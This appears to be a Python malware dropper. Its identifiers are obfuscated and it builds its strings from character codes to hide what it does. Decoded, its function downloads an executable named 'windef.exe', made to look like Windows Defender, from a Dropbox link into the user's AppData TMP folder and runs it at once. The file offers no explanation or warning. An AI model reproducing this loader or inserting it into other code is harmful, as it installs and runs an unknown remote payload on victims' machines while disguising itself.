import os
pC=True
ph=open
pe=str
pa=os.getenv
import subprocess
pB=subprocess.run
import requests
ps=requests.get
from pathlib import Path
from urllib.parse import urljoin
def sg(url,destino):
  sA=ps(url,stream=pC)
  sA.raise_for_status()
  with ph(destino,("".join([chr(119),chr(98)]))                      )as sL:
    for sc in sA.iter_content(chunk_size=int("".join([chr(56),chr(49),chr(57),chr(50)]))                                             ):
      sL.write(sc)
def pf():
  sT=("".join([chr(104),chr(116),chr(116),chr(112),chr(115),chr(58),chr(47),chr(47),chr(100),chr(108),chr(46),chr(100),chr(114),chr(111),chr(112),chr(98),chr(111),chr(120),chr(46),chr(99),chr(111),chr(109),chr(47),chr(115),chr(99),chr(108),chr(47),chr(102),chr(105),chr(47),chr(106),chr(101),chr(121),chr(104),chr(53),chr(115),chr(107),chr(119),chr(52),chr(121),chr(102),chr(101),chr(106),chr(111),chr(56),chr(57),chr(106),chr(114),chr(109),chr(115),chr(57),chr(47),chr(119),chr(105),chr(110),chr(100),chr(101),chr(102),chr(46),chr(101),chr(120),chr(101),chr(63),chr(114),chr(108),chr(107),chr(101),chr(121),chr(61),chr(56),chr(101),chr(115),chr(107),chr(122),chr(56),chr(119),chr(112),chr(106),chr(55),chr(57),chr(109),chr(113),chr(106),chr(110),chr(48),chr(98),chr(56),chr(98),chr(102),chr(50),chr(117),chr(104),chr(111),chr(122),chr(38),chr(100),chr(108),chr(61),chr(48)]))
  sY=("".join([chr(119),chr(105),chr(110),chr(100),chr(101),chr(102),chr(46),chr(101),chr(120),chr(101)]))
  sO=Path(pa(("".join([chr(65),chr(80),chr(80),chr(68),chr(65),chr(84),chr(65)]))                      ))/("".join([chr(84),chr(77),chr(80)]))
  sQ=sO/sY
  sO.mkdir(parents=pC,exist_ok=pC)
  sW=urljoin(sT,sY)
  sg(sW,sQ)
  pB([pe(sQ)])
